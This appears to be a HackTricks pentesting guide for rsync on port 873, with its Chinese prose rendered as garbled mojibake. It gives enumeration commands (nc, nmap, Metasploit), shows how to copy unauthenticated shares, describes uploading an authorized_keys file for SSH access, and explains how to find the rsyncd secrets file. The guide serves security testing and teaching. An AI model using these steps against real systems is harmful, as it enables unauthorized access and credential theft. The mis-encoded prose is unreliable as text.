# 873 - Pentesting Rsync

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **åŸºæœ¬ä¿¡æ¯**

æ¥è‡ª [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** æ˜¯ä¸€ä¸ªç”¨äºé«˜æ•ˆ [ä¼ è¾“](https://en.wikipedia.org/wiki/File\_transfer) å’Œ [åŒæ­¥](https://en.wikipedia.org/wiki/File\_synchronization) [æ–‡ä»¶](https://en.wikipedia.org/wiki/Computer\_file) çš„å·¥å…·ï¼Œèƒ½å¤Ÿåœ¨è®¡ç®—æœºä¸å¤–éƒ¨ç¡¬ç›˜ä¹‹é—´ä»¥åŠé€šè¿‡ [ç½‘ç»œ](https://en.wikipedia.org/wiki/Computer\_network) [è®¡ç®—æœº](https://en.wikipedia.org/wiki/Computer) ä¹‹é—´è¿›è¡Œæ¯”è¾ƒ [ä¿®æ”¹æ—¶é—´](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) å’Œæ–‡ä»¶å¤§å°ã€‚[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) å®ƒé€šå¸¸å‡ºç°åœ¨ [ç±» Unix](https://en.wikipedia.org/wiki/Unix-like) [æ“ä½œç³»ç»Ÿ](https://en.wikipedia.org/wiki/Operating\_system) ä¸Šã€‚rsync ç®—æ³•æ˜¯ä¸€ç§ [å¢é‡ç¼–ç ](https://en.wikipedia.org/wiki/Delta\_encoding)ï¼Œç”¨äºæœ€å°åŒ–ç½‘ç»œä½¿ç”¨ã€‚ [Zlib](https://en.wikipedia.org/wiki/Zlib) å¯ç”¨äºé¢å¤–çš„ [æ•°æ®å‹ç¼©](https://en.wikipedia.org/wiki/Data\_compression)ï¼Œ[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) å¹¶ä¸”å¯ä»¥ä½¿ç”¨ [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) æˆ– [stunnel](https://en.wikipedia.org/wiki/Stunnel) æ¥å¢å¼ºå®‰å…¨æ€§ã€‚

**é»˜è®¤ç«¯å£ï¼š** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## æšä¸¾

### æ¨ªå¹…ä¸æ‰‹åŠ¨é€šä¿¡
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **æšä¸¾å…±äº«æ–‡ä»¶å¤¹**

**Rsync æ¨¡å—**è¢«è§†ä¸ºå¯èƒ½**å—å¯†ç ä¿æŠ¤çš„ç›®å½•å…±äº«**ã€‚è¦è¯†åˆ«å¯ç”¨æ¨¡å—å¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦éœ€è¦å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
è¯·æ³¨æ„ï¼ŒæŸäº›å…±äº«å¯èƒ½ä¸ä¼šå‡ºç°åœ¨åˆ—è¡¨ä¸­ï¼Œå¯èƒ½ä¼šéšè—å®ƒä»¬ã€‚æ­¤å¤–ï¼Œè®¿é—®æŸäº›å…±äº«å¯èƒ½ä¼šé™åˆ¶ç‰¹å®šçš„ **credentials**ï¼Œå¹¶æ˜¾ç¤º **"Access Denied"** æ¶ˆæ¯ã€‚

### [**Brute Force**](../generic-methodologies-and-resources/brute-force.md#rsync)

### æ‰‹åŠ¨ Rsync ä½¿ç”¨

åœ¨è·å¾— **module list** åï¼Œæ“ä½œå–å†³äºæ˜¯å¦éœ€è¦èº«ä»½éªŒè¯ã€‚æ— éœ€èº«ä»½éªŒè¯æ—¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ **listing** å’Œ **copying** æ–‡ä»¶ä»å…±äº«æ–‡ä»¶å¤¹åˆ°æœ¬åœ°ç›®å½•ï¼š
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
è¿™ä¸ªè¿‡ç¨‹**é€’å½’åœ°ä¼ è¾“æ–‡ä»¶**ï¼Œä¿ç•™å®ƒä»¬çš„å±æ€§å’Œæƒé™ã€‚

ä½¿ç”¨**å‡­æ®**ï¼Œå¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼åˆ—å‡ºå’Œä¸‹è½½å…±äº«æ–‡ä»¶å¤¹ä¸­çš„å†…å®¹ï¼Œæ­¤æ—¶å°†å‡ºç°å¯†ç æç¤ºï¼š
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
è¦**ä¸Šä¼ å†…å®¹**ï¼Œä¾‹å¦‚ç”¨äºè®¿é—®çš„ _**authorized_keys**_ æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨ï¼š
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

è¦å®šä½rsyncdé…ç½®æ–‡ä»¶ï¼Œè¯·æ‰§è¡Œï¼š
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
åœ¨æ­¤æ–‡ä»¶ä¸­ï¼Œ_secrets file_ å‚æ•°å¯èƒ½æŒ‡å‘ä¸€ä¸ªåŒ…å« **ç”¨æˆ·åå’Œå¯†ç ** çš„æ–‡ä»¶ï¼Œç”¨äº rsyncd è®¤è¯ã€‚

## å‚è€ƒæ–‡çŒ®
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
